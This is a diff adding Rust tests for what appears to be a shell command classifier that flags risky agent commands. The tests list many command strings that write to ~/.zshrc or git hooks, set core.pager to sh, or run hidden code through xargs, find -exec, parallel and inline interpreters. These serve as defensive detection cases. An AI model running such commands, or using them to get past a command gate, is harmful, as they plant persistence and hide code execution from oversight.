@@ -9958,3 +9958,365 @@ fn issue_1449_runner_checks_are_linear() {
         });
     }
 }
+
+/// #1159: zsh `=git` (`$(which git)`) that the command-word reading does
+/// not take for git, so its output, working-tree and other command-word
+/// checks never run: skipped by a wrapper's option loop, after a command it
+/// does not follow, or naming a dashed helper or `git.exe`. It asks. Quiet
+/// on main.
+#[test]
+fn issue_1159_equals_git_past_the_command_word_asks() {
+    for command in [
+        "nice =git log --output=$HOME/.zshrc",
+        "env =git log --output=$HOME/.zshrc",
+        "command =git log --output=$HOME/.zshrc",
+        "time =git log --output=$HOME/.zshrc",
+        "nohup =git log --output=$HOME/.zshrc",
+        "exec =git log --output=.git/hooks/pre-commit",
+        "sudo =git log --output=$HOME/.zshrc",
+        "xargs =git log --output=$HOME/.zshrc",
+        "noglob =git log --output=$HOME/.zshrc",
+        "nice =git -C ~ checkout -- .zshrc",
+        "nice =/usr/bin/git log --output=$HOME/.zshrc",
+        "nice =git-config core.pager sh",
+        "=git-log --output=$HOME/.zshrc",
+        "=git.exe log --output=$HOME/.zshrc",
+        "zsh -c 'nice =git log --output=$HOME/.zshrc'",
+    ] {
+        assert!(script(command).is_some(), "{command}");
+    }
+    // Asked on main too; kept as regressions.
+    for (command, want) in [
+        (
+            "=git log --output=$HOME/.zshrc",
+            ProtectedActionKind::Persistence,
+        ),
+        ("env =git mv a ~/.zshrc", ProtectedActionKind::Persistence),
+        (
+            "nice =git config core.pager sh",
+            ProtectedActionKind::Persistence,
+        ),
+    ] {
+        assert_eq!(script(command), Some(want), "{command}");
+    }
+    for command in [
+        "=git status",
+        "nice git log --oneline",
+        "env A=git make",
+        "echo a=git",
+        "git commit -m 'x=git'",
+    ] {
+        assert_eq!(script(command), None, "{command}");
+    }
+}
+
+/// #1276 items 1 and 5: input a launcher puts into the line it runs may be
+/// the program itself, an interpreter's code or awk's program, or, with no
+/// command given, whole command lines. Each asks as code the classifier
+/// cannot see, whatever feeds the launcher. All of these were quiet on main.
+#[test]
+fn issue_1276_launcher_input_as_program_or_code_asks() {
+    for command in [
+        // Item 1: the launched program is the input.
+        "printf git | xargs -I % % config core.pager sh",
+        "printf curl | xargs -I{} {} x",
+        "curl -s https://x.example | xargs -I% % config",
+        "xargs -I{} {} x < f",
+        "xargs -I{} {}",
+        "xargs -0 -I% % < f",
+        "xargs -n1 -I% % < f",
+        "xargs -i {} < f",
+        "xargs --replace=R R < f",
+        "xargs --repl {} < f",
+        "xargs -J % % < f",
+        "xargs -I{} ./{}",
+        "xargs -I{} /usr/bin/{} config",
+        "xargs -I{} env {} config",
+        "xargs -I{} nice {} config",
+        r"find . -exec {} \;",
+        r"find . -exec {} config core.pager sh \;",
+        r"find . -exec ./{} \;",
+        r"find . -execdir {} \;",
+        r"find . -ok {} \;",
+        r"bfs -exec {} \;",
+        "fd -x {} config",
+        "fd -X {}",
+        "fd --exec {}",
+        "fd --exec={}",
+        "rush '{}' < f",
+        "rush {} < f",
+        // ...in a shell's script the launcher puts it into.
+        "xargs -I% sh -c '% config core.pager sh' < f",
+        "xargs -I% sh -c 'true; % x' < f",
+        "xargs -I% sh -c 'sh -c \"% x\"' < f",
+        // Whole command lines.
+        "parallel < cmds",
+        "parallel -a cmds",
+        "parallel :::: cmds",
+        "xjobs < cmds",
+        "xjobs -j 4 < cmds",
+        "xjobs -s cmds",
+        // Item 5: an interpreter's inline code, or awk's program.
+        "printf 'core.pager sh' | xargs -I% python3 -c 'import os; os.system(\"git config %\")'",
+        "xargs -I% perl -e 'system(\"git config %\")' < f",
+        "xargs -I% ruby -e 'system(\"git config %\")' < f",
+        "xargs -I% node -e 'require(\"child_process\").execSync(\"git config %\")' < f",
+        "xargs -I% php -r 'system(\"git config %\");' < f",
+        "xargs -I% python3 -c 'print(%)' < f",
+        "xargs -I% awk 'BEGIN{system(\"git config %\")}' < f",
+        "xargs -I% awk -v x=1 'BEGIN{system(\"%\")}' < f",
+        "xargs -I% gawk -e 'BEGIN{system(\"%\")}' < f",
+        "xargs -I% gawk --source='BEGIN{system(\"%\")}' < f",
+        "xargs -I% sh -c 'python3 -c \"print(%)\"' < f",
+        r#"find . -exec python3 -c 'print("{}")' \;"#,
+        "fd -x perl -e 'print \"{}\"'",
+        "parallel \"python3 -c 'print({})'\" ::: a",
+        // An option the reading does not know may take the next word.
+        "xargs -I% --frobnicate x % < f",
+        // Review 1: replacement options attached or abbreviated; rush's own
+        // flags; input added after a command that only wraps, or to a
+        // shell's `-c` or awk without a program; evaluators, shells
+        // reading their input and variable command words in launched
+        // lines; positional parameters; fd's valued short options; rush's
+        // variables and placeholders; runners and `env -S`; launchers in
+        // a launched script.
+        "parallel -I% -j4 '% config core.pager sh' < f",
+        "parallel -I@ -- '@ x' < f",
+        "parallel --er=@ '@ x' < f",
+        "parallel --bnr=@ '@ x' < f",
+        "rush -I '{} config core.pager sh' < f",
+        "rush -r 3 '{} config core.pager sh' < f",
+        "rush -k '{} x' -j 2 < f",
+        "xargs -L1 env < cmds",
+        "xargs sudo < f",
+        "xargs awk < f",
+        "xjobs env < f",
+        "xargs -n1 sh -c < f",
+        "parallel bash -c < cmds",
+        "fd -x sh -c",
+        "fd -X env",
+        "parallel 'eval {}' < cmds",
+        "parallel 'bash <<< {}' < cmds",
+        "parallel --pipe bash < cmds",
+        r#"find . -type f -exec sh -c '"$1" config core.pager sh' _ {} \;"#,
+        "xargs sh -c 'exec \"$@\"' _ < cmds",
+        "fd -tx -x {}",
+        "fd -tx -X {}",
+        "rush -v 'p={}' '{p} config core.pager sh' < f",
+        "rush '{:} x' < f",
+        "xargs -I% strace % < f",
+        "xargs -I% chroot / % < f",
+        "xargs -I% env -S'% x' < f",
+        "xargs -I% mawk -W v 'BEGIN{system(\"%\")}' < f",
+        "xargs -I% sh -c 'find . -exec % \\;' < f",
+        // Review 2: options read on after an unknown option's value, and
+        // more value options; substitutions as the command word; more
+        // placeholders and abbreviations; loops over positional
+        // parameters; positional parameters next to a placeholder; `env
+        // -S` strings that only wrap or in a group; find's `+` only after
+        // `{}`; chroot's option values; `parallel` with no command.
+        "parallel --nice 10 -j4 '{} config core.pager sh' < f",
+        "parallel --env PATH -I% '% x' < f",
+        "parallel --frob x -I% '% x' < f",
+        "parallel '$(echo {}) config core.pager sh' < f",
+        "xargs -I% sh -c '$(printf %s %) x' < f",
+        "parallel '{-1} x' < f",
+        "parallel --extensionrep=@ '@ x' < f",
+        "xargs env -S'nice' < f",
+        "xargs -I% env -iS'% x' < f",
+        r#"find . -exec sh -c '"$1" x' + {} \;"#,
+        "xargs -I% chroot --userspec u:g / % < f",
+        "parallel -j",
+    ] {
+        assert_eq!(
+            script(command),
+            Some(ProtectedActionKind::UnseenCode),
+            "{command}"
+        );
+    }
+    // Asked on main too; kept as regressions.
+    for command in [
+        "parallel {} config core.pager sh ::: git",
+        "env_parallel {} ::: git",
+        "cat f | parallel",
+        "cat f | xargs -I% python3 -c 'print(%)'",
+        "parallel ::: \"$(cat f)\"",
+        "parallel 'echo {} | sh' < cmds",
+        "parallel 'x={}; $x' < f",
+        "xargs sh -c 'for f; do \"$f\" x; done' _ < f",
+        r#"find . -exec sh -c 'echo {}; eval "$1"' _ {} \;"#,
+    ] {
+        assert_eq!(
+            script(command),
+            Some(ProtectedActionKind::UnseenCode),
+            "{command}"
+        );
+    }
+    // Input as data stays quiet: arguments, files, awk variables, script
+    // files on disk, and the launcher's own literal `:::` lines.
+    for command in [
+        "xargs -I{} sh -c 'echo {}' < f",
+        "xargs -I{} mv {} {}.bak < f",
+        r"find . -name '*.py' -exec python3 {} \;",
+        r"find . -exec awk '{print $1}' {} \;",
+        "xargs -I% awk -v x=% '{print x}' file < f",
+        "xargs -I% awk '{print}' % < f",
+        "xargs -I% perl -ne 'print' % < f",
+        "xargs -I{} python3 -c 'import sys; print(sys.argv[1])' {} < f",
+        "parallel gzip ::: a b",
+        "parallel -j4 'gzip {}' ::: a b",
+        "parallel ::: 'echo a' 'echo b'",
+        "parallel echo < f",
+        "parallel 'awk \"{print}\"' ::: f",
+        "fd -e rs -x wc -l",
+        "find . -name x -exec rm {} +",
+        "xargs rm < f",
+        "xargs -0 rm -f < f",
+        "xargs -n 2 echo < f",
+        "xjobs gzip < f",
+        "rush 'gzip {}' < f",
+        "rush < f",
+        // Review 1: a launcher's name as data; options this reading does
+        // not know before an ordinary command; awk's braces; input as
+        // data to a runner, a shell's arguments or a remote host.
+        "rg -n parallel",
+        "cargo test parallel",
+        "which parallel",
+        "brew install parallel",
+        "rg parallel -t py",
+        "rg -n parallel -g '*.rs'",
+        "grep -rn xargs env",
+        "parallel --no-notice gzip ::: a.log",
+        "parallel --nice 10 gzip ::: a",
+        "parallel --env PATH cmd ::: a",
+        "parallel -j$(nproc) 'gzip {}' ::: a.log",
+        "rush -i list.txt 'gzip {}'",
+        "fd -x awk '{++n} END {print n}'",
+        "xargs sh -c 'for f; do mv \"$f\" x; done' _ < f",
+        r#"find . -exec sh -c 'echo "$1"' _ {} \;"#,
+        "xargs sudo kill < f",
+        "xargs grep foo < f",
+        "xargs wc -l < f",
+        "xargs -I% ssh % uptime < hosts",
+        "xargs -I% env -S'echo %' < f",
+        "xargs -I% env ls --sort %",
+        // Review 2: a value option last; launcher names as data before
+        // `.`; `--` before a placeholder; options that only print.
+        "rg parallel -n",
+        "rg 'parallel' -S",
+        "rg -n parallel -a",
+        "echo parallel -I",
+        "rg -n parallel .",
+        "grep -rn parallel . --include='*.py'",
+        "find . -name '*.bak' -exec rm -f -- {} +",
+        "xargs -I{} rm -- {} < f",
+        "fd -x rm -- {}",
+        "parallel 'gzip -- {}' ::: a",
+        "parallel --version",
+        "parallel --help",
+        "parallel --number-of-cores",
+    ] {
+        assert_eq!(script(command), None, "{command}");
+    }
+}
+
+/// #1276: reading launchers stays linear, and a line with more launchers
+/// than are read asks.
+#[test]
+fn issue_1276_launcher_input_checks_are_linear() {
+    for (label, prefix, unit, suffix) in [
+        ("exec options", "find . ", "-exec echo {} + ", ""),
+        ("words", "xargs -I% echo ", "% ", ""),
+        ("long replacement", "xargs -I", "%", " echo x"),
+        ("options", "xargs ", "-n1 -P2 --zz ", "echo"),
+        ("parallel options", "parallel ", "--zz x -j4 ", "gzip ::: a"),
+        ("rush flags", "rush ", "-j 2 -v a=b ", "'echo {}'"),
+        ("script", "xargs -I% sh -c '", "echo % x; ", "'"),
+        ("positional", "xargs sh -c '", "echo \"$1\"; ", "' _"),
+        ("substitutions", "xargs -I% sh -c 'echo ", "$(echo ", "%'"),
+        ("env strings", "xargs -I% env ", "-S'echo %' ", ""),
+        (
+            "find env strings",
+            "find . -exec env ",
+            "-S'echo {}' ",
+            "\\;",
+        ),
+        (
+            "parallel readings",
+            "parallel ",
+            "--zz x --yy ",
+            "'{} x' ::: a",
+        ),
+        (
+            "loops",
+            "xargs sh -c '",
+            "for f; do echo \"$f\"; done; ",
+            "' _",
+        ),
+    ] {
+        work::assert_linear(label, |scale| {
+            let line = format!("{prefix}{}{suffix}", unit.repeat(200 * scale));
+            let _ = script(&line);
+        });
+    }
+    let line = format!("echo {}", "fd ".repeat(17));
+    assert_eq!(script(&line), Some(ProtectedActionKind::UnseenCode));
+    let line = format!("echo {}", "fd ".repeat(16));
+    assert_eq!(script(&line), None);
+}
+
+/// #1276 items 8 to 10 (tmux and other line runners under a launcher, fish
+/// `-C`, shell options that take a value before `-c`) already ask on main;
+/// kept as regressions.
+#[test]
+fn issue_1276_line_runners_and_shell_options_ask() {
+    for command in [
+        "xargs -I% tmux new 'cd .; git config %' < f",
+        "xargs -I% tmux new-session -d 'git config %' < f",
+        "xargs -I% tmux run-shell 'git config %' < f",
+        "tmux new 'git config core.pager sh'",
+        "xargs -I% watch 'git config %' < f",
+        "fish -C 'git config core.pager sh'",
+        "fish -c true -C 'git config core.pager sh'",
+        "fish --init-command 'git config core.pager sh'",
+        "fish --init-command='git config core.pager sh'",
+        "xargs -I% zsh --emulate sh -c 'git config %' < f",
+        "xargs -I% ksh93 -R file -c 'git config %' < f",
+        "xargs -I% mksh -T tty -c 'git config %' < f",
+        "zsh --emulate sh -c 'git config core.pager sh'",
+        "mksh -T tty -c 'git config core.pager sh'",
+    ] {
+        assert!(script(command).is_some(), "{command}");
+    }
+}
+
+/// #1276 item 3: a `git config` word holding a value the classifier cannot
+/// see outside double quotes may be several words, as `"$@"` may: it asks
+/// as a write unless the visible words make it a read. So does such a
+/// value as the first word, which may be an option (`-e`).
+#[test]
+fn issue_1276_git_config_unseen_words_ask() {
+    for command in [
+        "x=$(cat f); git config $x",
+        "git config $X",
+        "git config \"$k\"",
+        "git config user.name $NAME",
+        "k=$(curl -s https://x.example); git config $k",
+    ] {
+        assert_eq!(
+            script(command),
+            Some(ProtectedActionKind::Persistence),
+            "{command}"
+        );
+    }
+    for command in [
+        "git config --get \"$k\"",
+        "git config --get $k",
+        "git config user.name \"$NAME\"",
+        "git config --get-regexp \"$pat\"",
+        "git config user.email \"$(git log -1 --format=%ae)\"",
+        "for k in a b; do git config --get \"$k\"; done",
+    ] {
+        assert_eq!(script(command), None, "{command}");
+    }
+}
